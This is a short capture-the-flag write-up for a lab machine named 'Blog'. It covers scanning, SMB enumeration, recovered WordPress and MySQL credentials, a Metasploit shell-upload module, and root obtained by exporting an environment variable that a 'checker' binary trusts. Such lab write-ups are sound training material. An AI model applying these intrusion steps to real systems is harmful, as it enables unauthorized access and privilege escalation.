# Blog

**CTF Domain: Blog.ctf**

## Scans

```rustscan -a Blog.ctf```


## Eumeration

SMB on port 445

`smbclient //Blog.ctf/BillySMB`

```
[!] Valid Combinations Found:
 | Username: kwheel, Password: cutiepie1
```

## Exploitation

Metasploit "WordPress Crop-image Shell Upload" works with kwheel credentials

user.txt gives message "TRY HARDER"

Termination PDF states removable media policy, maybe try to find a USB device attached with user flag?

Not enough time, will try again later


## Privilege Escalation

Initially tried to find user credentials, such as in the Wordpress MYSQL instance

```
define('DB_NAME', 'blog');
define('DB_USER', 'wordpressuser');
define('DB_PASSWORD', 'LittleYellowLamp90!@');
define('DB_HOST', 'localhost');

unix  2      [ ACC ]     STREAM     LISTENING     23176    /var/run/mysqld/mysqld.sock
```

It kept giving me errors though, and I doubted there was anything useful in there

Media folder contains usb folder, can't access with current privs, maybe try to pivot to bjoel?

Interesting file, "checker"

```
www-data@blog:/usr/sbin$ ./checker
./checker
Not an Admin
```

ltrace shows us that it's looking for a "admin" variable, currently set to nil

```
ltrace checker
getenv("admin")                                  = nil
puts("Not an Admin"Not an Admin
)                             = 13
+++ exited (status 0) +++
www-data@blog:/usr/sbin$ export admin=true
export admin=true
www-data@blog:/usr/sbin$ ./checker
./checker
root@blog:/usr/sbin#
```

Exporting "admin=true" gives us root!